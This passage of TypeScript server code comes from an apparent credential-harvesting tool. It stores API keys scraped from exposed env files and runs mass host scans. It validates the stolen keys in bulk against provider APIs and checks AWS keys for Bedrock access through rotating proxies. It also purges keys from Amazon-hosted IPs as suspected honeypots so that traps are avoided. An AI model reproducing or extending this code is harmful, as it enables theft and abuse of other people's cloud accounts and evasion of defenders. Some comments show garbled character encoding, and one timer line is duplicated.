        .slice(0, 20);

      if (pending.length === 0) return;
      console.log(`[auto-validate] batch: ${pending.length} keys, services: ${[...new Set(pending.map(k => String(k.service)))].join(", ")}`);

      // Run in parallel groups of 5 to avoid flooding rate-limited provider APIs
      for (let i = 0; i < pending.length; i += 5) {
        const group = pending.slice(i, i + 5);
        await Promise.all(group.map((k) => performValidation(String(k.id))));
        if (i + 5 < pending.length) await new Promise((r) => setTimeout(r, 500));
      }
    } catch (err) {
      console.error("[auto-validate] error:", String(err));
    }
  }
  setTimeout(runAutoValidate, 8_000);
  setInterval(runAutoValidate, 45_000);


// ── Automatic honeypot purge ──────────────────────────────────────────────────
// Keys from catch-all honeypot hosts accumulate fast (thousands per host).
// This runs at startup and hourly to keep found_keys.jsonl clean.
function autoPurgeHoneypotKeys(): void {
  const ENV_FOUND_FILE = path.join(DATA_DIR, "env_found.jsonl");
  if (!fs.existsSync(ENV_FOUND_FILE) || !fs.existsSync(KEYS_FILE)) return;
  try {
    // Read env_found to detect catch-all honeypot hosts
    const envContent = fs.readFileSync(ENV_FOUND_FILE, "utf-8");
    const envItems = envContent.trim().split("\n").filter(Boolean).map(line => {
      try { return JSON.parse(line) as Record<string, unknown>; } catch { return null; }
    }).filter(Boolean) as Record<string, unknown>[];

    // Also detect high-volume hosts (500+ keys in found_keys)
    const hostKeyCount = new Map<string, number>();
    const keyLines = fs.readFileSync(KEYS_FILE, "utf-8").trim().split("\n").filter(Boolean);
    for (const line of keyLines) {
      try {
        const r = JSON.parse(line) as Record<string, unknown>;
        const url = String(r.url ?? r.query ?? "");
        let host = "";
        try { host = new URL(url).hostname; } catch { host = url; }
        if (host) hostKeyCount.set(host, (hostKeyCount.get(host) ?? 0) + 1);
      } catch { /* skip */ }
    }

    const honeypotHosts = detectHoneypotHosts(envItems);
    const highVolumeHosts = new Set<string>(
      // 1000+ keys from one host = catch-all honeypot (conservative threshold)
      [...hostKeyCount.entries()].filter(([, c]) => c >= 1000).map(([h]) => h)
    );
    const allBadHosts = new Set([...honeypotHosts, ...highVolumeHosts]);

    if (allBadHosts.size === 0) return;

    // Build a set of keys to keep: exclude honeypot/Amazon hosts
    // Client rule: Amazon IP = honeypot, no exceptions (even STS-validated).
    const kept: string[] = [];
    let removed = 0;
    for (const line of keyLines) {
      try {
        const r = JSON.parse(line) as Record<string, unknown>;
        const url = String(r.url ?? r.query ?? "");
        let host = "";
        try { host = new URL(url).hostname; } catch { host = url; }
        if (!host) { kept.push(line); continue; }
        if (allBadHosts.has(host) || isAmazonHost(host)) {
          removed++;
        } else {
          kept.push(line);
        }
      } catch { kept.push(line); }
    }

    if (removed === 0) return;

    const tmp = KEYS_FILE + ".autopurge." + process.pid;
    fs.writeFileSync(tmp, kept.join("\n") + (kept.length ? "\n" : ""));
    fs.renameSync(tmp, KEYS_FILE);
    // Reset cache so it loads the cleaned data
    _keysBaseCache.clear();
    refreshKeysCache();
    invalidateStatsCache();
    console.log(`[auto-purge] removed ${removed} honeypot/amazon keys from ${allBadHosts.size} hosts (${kept.length} kept)`);
  } catch (e) {
    console.error("[auto-purge] error:", e);
  }
}

// ── Batch key updates ─────────────────────────────────────────────────────────
// Apply multiple updates by reading KEYS_FILE once rather than N times.
function applyBatchUpdates(updates: Array<{ id: string; updates: Record<string, unknown> }>): void {
  if (updates.length === 0) return;
  try {
    const records = readJsonl(KEYS_FILE);
    const map = new Map<string, Record<string, unknown>>();
    for (const r of records) {
      const id = String(r.fingerprint ?? r.id ?? "");
      if (!id) continue;
      const ex = map.get(id);
      if (!ex || (ex.validated_at == null && r.validated_at != null)) map.set(id, r);
    }
    const lines: string[] = [];
    for (const { id, updates: upd } of updates) {
      const base = map.get(id);
      if (!base) continue;
      lines.push(JSON.stringify({ ...base, ...upd }));
    }
    if (lines.length > 0) fs.appendFileSync(KEYS_FILE, lines.join("\n") + "\n");
  } catch (e) { console.error("[batch-updates] error:", e); }
}
  // Hourly compaction: deduplicate found_keys.jsonl
  setTimeout(compactKeysFile, 10 * 60_000);
  setInterval(compactKeysFile, 60 * 60_000);

  // Automatic honeypot purge: run at startup (60s delay) and every 2 hours
  // Keeps the file small by removing catch-all / Amazon-IP honeypot keys
  setTimeout(autoPurgeHoneypotKeys, 60_000);
  setInterval(autoPurgeHoneypotKeys, 2 * 60 * 60_000);

  // â”€â”€ Bedrock re-check for existing valid AWS keys â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  // Keys validated before aws_bedrock_access existed don't have the flag.
  // Periodically re-check their Bedrock access WITHOUT repeating the STS call.
  async function runBedrockBackfill(): Promise<void> {
    const proxy = getRandomUserProxy();

    // Use cache (non-blocking) instead of readKeysDedup() for hot-path checks
    const allValidAws = keysFromCache().filter((r) =>
      String(r.service) === "aws" &&
      r.status === "valid" &&
      (!r.bedrock_iam_verified || !r.amazon_hosted_checked)
    );

    if (allValidAws.length === 0) return;
    console.log(`[bedrock-backfill] ${allValidAws.length} valid AWS keys to process`);

    // Batch all updates in memory, apply via single append-pass at the end.
    // This avoids re-reading the 50-100MB file for every key (which blocks event loop).
    const pendingUpdates: Array<{ id: string; updates: Record<string, unknown> }> = [];

    // Phase 1: fast local checks (no network) — process ALL valid AWS keys
    let honeypotDowngrades = 0;
    const skipIds = new Set<string>();

    for (const raw of allValidAws) {
      const id = String(raw.fingerprint ?? raw.id ?? "");

      // 1a. Amazon-hosted IP → always honeypot (no exceptions)
      // Even STS-validated keys from Amazon are traps by client rule.
      const hostIp = extractHostIp(raw);
      if (hostIp && isAmazonHost(hostIp) && raw.amazon_hosted !== true) {
        pendingUpdates.push({ id, updates: {
          status: "honeypot",
          amazon_hosted: true,
          aws_bedrock_access: false,
          aws_bedrock_checked_at: new Date().toISOString(),
        }});
        honeypotDowngrades++;
        skipIds.add(id);
        continue;
      }

      // 1b. ABSK token present → mark Bedrock access true (ABSK is a valid Bedrock credential)
      //     and ensure bedrock_iam_verified so we skip expensive IAM API call for these.
      if (raw.aws_bedrock_token && raw.aws_bedrock_access !== true) {
        pendingUpdates.push({ id, updates: {
          aws_bedrock_access: true,
          bedrock_iam_verified: true,
          aws_bedrock_checked_at: new Date().toISOString(),
        }});
        continue;
      }

      // 1c. Previously we reset bedrock flags (ABSK mistaken for IAM-only).
      //     If a key was reset (bedrock_access=false, bedrock_iam_verified=false),
      //     let it fall through to Phase 2 for proper IAM check.
    }

    // Apply all Phase 1 updates with a single file pass (avoids N×readKeysDedup)
    if (pendingUpdates.length > 0) {
      applyBatchUpdates(pendingUpdates);
      pendingUpdates.length = 0; // clear
    }

    if (honeypotDowngrades > 0) {
      console.log(`[bedrock-backfill] ✓ ${honeypotDowngrades} keys → honeypot (Amazon IPs)`);
      invalidateStatsCache();
    }

    // Phase 2: IAM Bedrock check via SigV4 (needs proxy) — small batch
    if (!proxy) return;
    const apiCandidates = allValidAws
      .filter((r) => !skipIds.has(String(r.fingerprint ?? r.id ?? "")))
      .filter((r) => {
        const h = extractHostIp(r);
        return !(h && isAmazonHost(h));
      })
      .filter((r) => !r.bedrock_iam_verified) // only unverified
      .slice(0, 15);

    for (const raw of apiCandidates) {
      const id = String(raw.fingerprint ?? raw.id ?? "");
      const keyId = String(raw.key ?? "");
      if (!keyId.startsWith("AKIA")) {
        pendingUpdates.push({ id, updates: { bedrock_iam_verified: true, aws_bedrock_checked_at: new Date().toISOString() } });
        continue;
      }

      let secret = extractAwsSecret(String(raw.snippet ?? ""));
      if (!secret) {
        const full = getEnvFoundContent(String(raw.url ?? ""));
        if (full) secret = extractAwsSecret(full);
      }
      if (!secret) {
        pendingUpdates.push({ id, updates: { bedrock_iam_verified: true, aws_bedrock_checked_at: new Date().toISOString() } });
        continue;
      }

      try {
        const hasBedrock = await checkBedrockAccess(keyId, secret, proxy);
        pendingUpdates.push({ id, updates: {
          aws_bedrock_access: hasBedrock,
          bedrock_iam_verified: true,
          aws_bedrock_checked_at: new Date().toISOString(),
        }});
        if (hasBedrock) console.log(`[bedrock-backfill] ✓ Real Bedrock IAM access: ${keyId.slice(0, 12)}…`);
      } catch {
        pendingUpdates.push({ id, updates: { bedrock_iam_verified: true, aws_bedrock_checked_at: new Date().toISOString() } });
      }
      // Brief pause between API calls
      await new Promise((r) => setTimeout(r, 500));
    }

    if (pendingUpdates.length > 0) {
      applyBatchUpdates(pendingUpdates);
      invalidateStatsCache();
    }
  }
  setTimeout(runBedrockBackfill, 30_000);  setTimeout(runBedrockBackfill, 30_000);
  setInterval(runBedrockBackfill, 10 * 60_000);

  // GET /monitor/config
  router.get("/config", (req, res) => {
    const settings = readJson(SETTINGS_FILE, {}) as Record<string, unknown>;
    const sources = readJson(SOURCES_FILE, []) as Record<string, unknown>[];
    const enabledNames = sources.filter((s) => s.enabled !== false).map((s) => s.name as string);

    res.json({
      queries: settings.queries ?? [],
      intervalSeconds: settings.interval_seconds ?? 600,
      concurrency: settings.concurrency ?? 25,
      maxResultsPerSource: settings.max_results_per_source ?? 20,
      httpTimeoutSeconds: settings.http_timeout_seconds ?? 20,
      enabledSources: (settings.enabled_sources as string[]) ?? enabledNames,
      autoValidate: settings.auto_validate ?? true,
      autoChainEnabled: settings.auto_chain_enabled ?? false,
      autoChainIntervalSeconds: settings.auto_chain_interval_seconds ?? 1800,
      autoChainMaxHosts: settings.auto_chain_max_hosts ?? 200000,
      autoChainPorts: settings.auto_chain_ports ?? "80,443,8080,8443",
      autoChainDeepScan: settings.auto_chain_deep_scan ?? false,
      autoChainDiscoveriesPerPublic: settings.auto_chain_discoveries_per_public ?? 3,
      autoChainSelfTriggerPublic: settings.auto_chain_self_trigger_public ?? false,
      githubToken: typeof settings.github_token === "string" ? (settings.github_token as string) : "",
      categoryRotation: settings.category_rotation ?? true,
    });
  });

  // PUT /monitor/config
  router.put("/config", (req, res) => {
    const body = req.body as Record<string, unknown>;
    const existing = readJson(SETTINGS_FILE, {}) as Record<string, unknown>;
    const updated = {
      ...existing,
      queries: body.queries ?? existing.queries,
      interval_seconds: body.intervalSeconds ?? existing.interval_seconds,
      concurrency: body.concurrency ?? existing.concurrency,
      max_results_per_source: body.maxResultsPerSource ?? existing.max_results_per_source,
      http_timeout_seconds: body.httpTimeoutSeconds ?? existing.http_timeout_seconds,
      enabled_sources: body.enabledSources ?? existing.enabled_sources,
      auto_validate: body.autoValidate ?? existing.auto_validate,
      auto_chain_enabled: body.autoChainEnabled ?? existing.auto_chain_enabled ?? false,
      auto_chain_interval_seconds: body.autoChainIntervalSeconds ?? existing.auto_chain_interval_seconds ?? 1800,
      auto_chain_max_hosts: body.autoChainMaxHosts ?? existing.auto_chain_max_hosts ?? 50000,
      auto_chain_ports: body.autoChainPorts ?? existing.auto_chain_ports ?? "80,443,8080,8443",
      auto_chain_deep_scan: body.autoChainDeepScan ?? existing.auto_chain_deep_scan ?? false,
      auto_chain_discoveries_per_public: body.autoChainDiscoveriesPerPublic ?? existing.auto_chain_discoveries_per_public ?? 3,
      auto_chain_self_trigger_public: body.autoChainSelfTriggerPublic ?? existing.auto_chain_self_trigger_public ?? false,
      github_token: typeof body.githubToken === "string"
        ? (body.githubToken as string).trim()
        : (existing.github_token ?? ""),
      category_rotation: typeof body.categoryRotation === "boolean"
        ? body.categoryRotation
        : (existing.category_rotation ?? true),
    };
    fs.writeFileSync(SETTINGS_FILE, JSON.stringify(updated, null, 2));

    // Update enabled status in sources.json
    if (body.enabledSources) {
      const enabledSet = new Set(body.enabledSources as string[]);
      const sources = readJson(SOURCES_FILE, []) as Record<string, unknown>[];
      const updatedSources = sources.map((s) => ({
        ...s,
        enabled: enabledSet.has(s.name as string),
      }));
      fs.writeFileSync(SOURCES_FILE, JSON.stringify(updatedSources, null, 2));
    }

    res.json({
      queries: updated.queries,
      intervalSeconds: updated.interval_seconds,
      concurrency: updated.concurrency,
      maxResultsPerSource: updated.max_results_per_source,
      httpTimeoutSeconds: updated.http_timeout_seconds,
      enabledSources: updated.enabled_sources,
      autoValidate: updated.auto_validate,
      autoChainEnabled: updated.auto_chain_enabled,
      autoChainIntervalSeconds: updated.auto_chain_interval_seconds,
      autoChainMaxHosts: updated.auto_chain_max_hosts,
      autoChainPorts: updated.auto_chain_ports,
      autoChainDeepScan: updated.auto_chain_deep_scan,
      autoChainDiscoveriesPerPublic: updated.auto_chain_discoveries_per_public,
      autoChainSelfTriggerPublic: updated.auto_chain_self_trigger_public,
      githubToken: typeof updated.github_token === "string" ? (updated.github_token as string) : "",
      categoryRotation: updated.category_rotation,
    });
  });

  // GET /monitor/proxy-config â€” read free-proxy retry toggle.
  router.get("/proxy-config", (_req, res) => {
    let enabled = false;
    try {
      if (fs.existsSync(PROXY_CONFIG_FILE)) {
        const j = JSON.parse(fs.readFileSync(PROXY_CONFIG_FILE, "utf-8")) as { enabled?: unknown };
        enabled = j.enabled === true;
      }
    } catch { /* default false */ }
    // Pool size, if cache exists. Lets the UI show "0 working" honestly.
    let poolSize = 0;
    try {
      const cache = path.join(DATA_DIR, "proxy_pool_cache.json");
      if (fs.existsSync(cache)) {
        const j = JSON.parse(fs.readFileSync(cache, "utf-8")) as { proxies?: unknown[] };
        if (Array.isArray(j.proxies)) poolSize = j.proxies.length;
      }
    } catch { /* ignore */ }
    res.json({ enabled, poolSize });
  });

  // POST /monitor/proxy-config â€” toggle free-proxy retry.
  router.post("/proxy-config", (req, res) => {
    const body = req.body as { enabled?: unknown };
    const enabled = body.enabled === true;
    ensureDataDir();
    fs.writeFileSync(PROXY_CONFIG_FILE, JSON.stringify({ enabled }));
    res.json({ enabled });
  });

  // GET /monitor/user-proxies â€” list saved user proxies + config
  router.get("/user-proxies", (_req, res) => {
    const proxies = getUserProxies();
    const enabled = isUserProxyEnabled();
    let raw = "";
    try {
      if (fs.existsSync(USER_PROXIES_FILE)) raw = fs.readFileSync(USER_PROXIES_FILE, "utf-8");
    } catch { /* empty */ }
    res.json({ enabled, count: proxies.length, raw });
  });

  // POST /monitor/user-proxies â€” save list and toggle
  router.post("/user-proxies", (req, res) => {
    const body = req.body as { enabled?: unknown; raw?: unknown };
    ensureDataDir();
    if (typeof body.raw === "string") {
      fs.writeFileSync(USER_PROXIES_FILE, body.raw);
    }
    const enabled = body.enabled === true;
    fs.writeFileSync(USER_PROXIES_CONFIG_FILE, JSON.stringify({ enabled }));
    const count = getUserProxies().length;
    res.json({ enabled, count });
  });

  // GET /monitor/auto-chain/status
  router.get("/auto-chain/status", (_req, res) => {
    res.json(getAutoChainStatus());
  });

  // POST /monitor/auto-chain/trigger â€” manual "Run Now" button
  router.post("/auto-chain/trigger", (_req, res) => {
    res.json(triggerAutoChain());
  });

  // â”€â”€ Manual Mode â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  // One-click toggle that stops all active scans + disables autostart so the
  // operator can work by hand, then re-enables 24/7 scanning when toggled off.

  // GET /monitor/manual-mode â€” current state for the UI toggle.
  router.get("/manual-mode", (_req, res) => {
    res.json({ manualMode: getManualMode() });
  });

  // POST /monitor/manual-mode â€” body { enable: boolean }.
  //   enable=true  â†’ stop every scan + turn off auto-chain.
  //   enable=false â†’ restore auto-chain + resume public scanner.
  router.post("/manual-mode", (req, res) => {
    const body = (req.body ?? {}) as { enable?: unknown };
    const enable = body.enable === true;
    const result = setManualMode(enable);
    res.json(result);
  });

  // POST /monitor/restart â€” gracefully exits the API server.
  // one-click "Restart Server" button from the Config page.
  router.post("/restart", (_req, res) => {
    res.json({ success: true, message: "Server restartingâ€¦" });
    setTimeout(() => {
      // eslint-disable-next-line n/no-process-exit
      process.exit(0);
    }, 250);
  });

  // POST /monitor/check-key â€” manual key/secret validation (auto-detects service)
  router.post("/check-key", async (req, res) => {
    const body = req.body as Record<string, unknown>;
    const key = String(body.key ?? "").trim();

    if (!key || key.length < 6) {
      res.status(400).json({ status: "error", message: "Secret too short or missing" });
      return;
    }

    const maskKey = (k: string) =>
      k.startsWith("http") ? k.slice(0, 28) + "â€¦" + k.slice(-8)
      : k.length > 12 ? k.slice(0, 8) + "â€¦" + k.slice(-4)
      : k.slice(0, 4) + "â€¦";

    // Allow service override from body
    const service = String(body.service ?? detectService(key) ?? "");
    if (!service) {
      res.json({ key: maskKey(key), service: "unknown", status: "error",
        message: "Could not detect service from secret format" });
      return;
    }

    const validator = PROVIDER_VALIDATORS[service];
    if (!validator) {
      res.json({ key: maskKey(key), service, status: "error",
        message: `No validator for service '${service}'` });
      return;
    }

    const category = validator.category ?? "other";

    // â”€â”€ Special validators â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if (validator.special === "jwt") {
      try {
        const parts = key.split(".");
        if (parts.length !== 3) throw new Error("Not a valid JWT structure");
        const payload = JSON.parse(Buffer.from(parts[1], "base64url").toString("utf-8"));
        const now = Math.floor(Date.now() / 1000);
        const exp = typeof payload.exp === "number" ? payload.exp : null;
        const expired = exp !== null && exp < now;
        const claims = Object.keys(payload).join(", ");
        const expStr = exp ? new Date(exp * 1000).toISOString() : "no expiry";
        res.json({
          key: maskKey(key), service, category, status: expired ? "invalid" : "valid",
          message: expired
            ? `JWT expired at ${expStr} â€” claims: ${claims}`
            : `JWT valid (decoded) â€” expires: ${expStr} â€” claims: ${claims}`,
          httpStatus: null,
          meta: { exp, iat: payload.iat, sub: payload.sub, iss: payload.iss },
        });
      } catch (err) {
        res.json({ key: maskKey(key), service, category, status: "error",
          message: `JWT decode failed: ${String(err)}`, httpStatus: null });
      }
      return;
    }

    if (validator.special === "connection_string") {
      try {
        const url = new URL(key);
        const hasPassword = url.password && url.password.length > 0;
        const meta = { host: url.hostname, port: url.port || "default", db: url.pathname.slice(1), user: url.username };
        res.json({
          key: maskKey(key), service, category,
          status: hasPassword ? "valid" : "error",
          message: hasPassword
            ? `Connection string parsed â€” host: ${meta.host}, db: ${meta.db}`
            : "Connection string has no password",
          httpStatus: null, meta,
        });
      } catch {
        res.json({ key: maskKey(key), service, category, status: "error",
          message: "Could not parse connection string URL", httpStatus: null });
      }
      return;
    }

    if (validator.special === "webhook_url") {
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), 8000);
        const resp = await fetch(key, { signal: controller.signal });
        clearTimeout(timer);
        const statusVal = resp.status < 500 ? "valid" : "error";
        res.json({ key: maskKey(key), service, category, status: statusVal,
          message: `Webhook URL reachable â€” HTTP ${resp.status}`, httpStatus: resp.status });
      } catch (err) {
        res.json({ key: maskKey(key), service, category, status: "error",
          message: `Webhook unreachable: ${String(err)}`, httpStatus: null });
      }
      return;
    }

    // â”€â”€ Standard HTTP validator â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 12000);
      const url = validator.urlFn ? validator.urlFn(key) : validator.url;
      const resp = await fetch(url, {
        method: validator.method ?? "GET",
        headers: {
          ...(validator.method === "POST" ? { "Content-Type": "application/json" } : {}),
          ...validator.headerFn(key),
        },
        body: validator.body ? JSON.stringify(validator.body) : undefined,
        signal: controller.signal,
      });
      clearTimeout(timer);

      const statusVal = httpToStatus(resp.status);
      const message =
        statusVal === "valid"        ? `HTTP ${resp.status} â€” accepted by ${service} API` :
        statusVal === "invalid"      ? `HTTP ${resp.status} â€” rejected by ${service} API` :
        statusVal === "rate_limited" ? `HTTP 429 â€” rate limited (key valid, quota exceeded)` :
                                      `HTTP ${resp.status} â€” unexpected response`;

      res.json({ key: maskKey(key), service, category, status: statusVal, message, httpStatus: resp.status });
    } catch (err) {
      res.json({ key: maskKey(key), service, category, status: "error",
        message: String(err), httpStatus: null });
    }
  });

  // â”€â”€ Bulk validation â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  // Runs background validation for all unchecked keys of a given service.

  interface BulkState {
    running: boolean;
    service: string;
    total: number;
    processed: number;
    valid: number;
    errors: number;
    startedAt: string | null;
    finishedAt: string | null;
    keysPerMin: number;
  }

  let _bulkState: BulkState = {
    running: false, service: "", total: 0, processed: 0, valid: 0, errors: 0,
    startedAt: null, finishedAt: null, keysPerMin: 0,
  };
  let _bulkAbort = false;

  async function runBulkJob(service: string, maxKeys: number) {
    _bulkAbort = false;
    const all = keysFromCache()
      .map(normalizeResult).filter((k) => (!k.status || k.status === "unchecked") &&
        k.key && k.service === service &&
        PROVIDER_VALIDATORS[service]
      )
      .sort((a, b) => String(b.firstSeenAt ?? "").localeCompare(String(a.firstSeenAt ?? "")))
      .slice(0, maxKeys);

    _bulkState = {
      running: true, service, total: all.length, processed: 0, valid: 0, errors: 0,
      startedAt: new Date().toISOString(), finishedAt: null, keysPerMin: 0,
    };

    if (all.length === 0) {
      _bulkState.running = false;
      _bulkState.finishedAt = new Date().toISOString();
      return;
    }

    const startMs = Date.now();
    const BATCH = 5;
    for (let i = 0; i < all.length; i += BATCH) {
      if (_bulkAbort) break;
      const group = all.slice(i, i + BATCH);
      const results = await Promise.allSettled(
        group.map((k) => performValidation(String(k.id))),
      );
      for (const r of results) {
        _bulkState.processed++;
        if (r.status === "fulfilled") {
          if (r.value.status === "valid") _bulkState.valid++;
          else if (r.value.status === "error") _bulkState.errors++;
        } else {
          _bulkState.errors++;
        }
      }
      const elapsedMin = (Date.now() - startMs) / 60000;
      _bulkState.keysPerMin = elapsedMin > 0 ? Math.round(_bulkState.processed / elapsedMin) : 0;
      // Tiny pause between batches to avoid flooding providers
      if (i + BATCH < all.length && !_bulkAbort) {
        await new Promise((r) => setTimeout(r, 300));
      }
    }

    _bulkState.running = false;
    _bulkState.finishedAt = new Date().toISOString();
    invalidateStatsCache();
  }

  // GET /monitor/validate-bulk/status
  router.get("/validate-bulk/status", (_req, res) => {
    res.json(_bulkState);
  });

  // POST /monitor/validate-bulk/start â€” body: { service, maxKeys? }
  router.post("/validate-bulk/start", (req, res) => {
    if (_bulkState.running) {
      res.status(409).json({ error: "Bulk validation already running", state: _bulkState });
      return;
    }
    const body = req.body as { service?: string; maxKeys?: number };
    const service = String(body.service ?? "aws").trim();
    const maxKeys = Math.min(10000, Math.max(1, Number(body.maxKeys ?? 500)));

    if (!PROVIDER_VALIDATORS[service]) {
      res.status(400).json({ error: `No validator for service '${service}'` });
      return;
    }

    // Count unchecked keys upfront so UI shows realistic numbers
    const count = keysFromCache()
      .map(normalizeResult).filter((k) => (!k.status || k.status === "unchecked") && k.service === service && k.key)
      .length;

    if (count === 0) {
      res.json({ success: true, message: `No unchecked ${service} keys found`, count: 0, state: _bulkState });
      return;
    }

    // Fire-and-forget
    void runBulkJob(service, maxKeys);

    const proxy = getRandomUserProxy();
    const rate = proxy ? "~300 keys/min" : "~150 keys/min";
    res.json({
      success: true,
      message: `Started â€” ${service} at ${rate} (${Math.min(count, maxKeys)} keys)`,
      count: Math.min(count, maxKeys),
      state: _bulkState,
    });
  });

  // POST /monitor/validate-bulk/stop
  router.post("/validate-bulk/stop", (_req, res) => {
    _bulkAbort = true;
    res.json({ success: true, message: "Bulk validation stopping after current batch" });
  });

  // GET /monitor/validate-bulk/counts â€” unchecked counts per service
  router.get("/validate-bulk/counts", (_req, res) => {
    const allKeys = keysFromCache().map(normalizeResult);
    const counts: Record<string, { unchecked: number; total: number }> = {};
    for (const k of allKeys) {
      const svc = String(k.service ?? "unknown");
      if (!counts[svc]) counts[svc] = { unchecked: 0, total: 0 };
      counts[svc].total++;
      if (!k.status || k.status === "unchecked") counts[svc].unchecked++;
    }
    res.json(counts);
  });

  // GET /monitor/sysinfo â€” system resources (used by fleet main panel)
  router.get("/sysinfo", (_req, res) => {
    try {
      let loadAvg = os.loadavg();
      let memTotal = os.totalmem();
      let memAvail = os.freemem();
      // On Linux, read /proc/meminfo for more accurate MemAvailable
      try {
        const meminfo = fs.readFileSync("/proc/meminfo", "utf-8");
        const avail = /MemAvailable:\s+(\d+)/.exec(meminfo);
        if (avail) memAvail = parseInt(avail[1]) * 1024;
        const total = /MemTotal:\s+(\d+)/.exec(meminfo);
        if (total) memTotal = parseInt(total[1]) * 1024;
      } catch { /* not Linux */ }
      res.json({ cpus: os.cpus().length, loadAvg, memTotal, memAvail });
    } catch (e) {
      res.json({ cpus: os.cpus().length, loadAvg: [0, 0, 0], memTotal: 0, memAvail: 0 });
    }
  });

  // GET /monitor/source-statuses
  router.get("/source-statuses", (req, res) => {
    const status = readJson(STATUS_FILE, { source_statuses: [] }) as Record<string, unknown>;
    const sourceStatuses = status.source_statuses as Record<string, unknown>[] | null;
    if (sourceStatuses?.length) {
      res.json(sourceStatuses.map((s) => ({
        name: s.name,
        category: s.category ?? "other",
        status: s.status ?? "pending",
        enabled: s.enabled ?? true,
      })));
      return;
    }
    // Fallback: return from sources.json
    const sources = readJson(SOURCES_FILE, []) as Record<string, unknown>[];
    res.json(sources.map((s) => ({
      name: s.name,
      category: s.category ?? "other",
      status: s.enabled !== false ? "pending" : "disabled",
      enabled: s.enabled !== false,
    })));
  });



  return router;
}

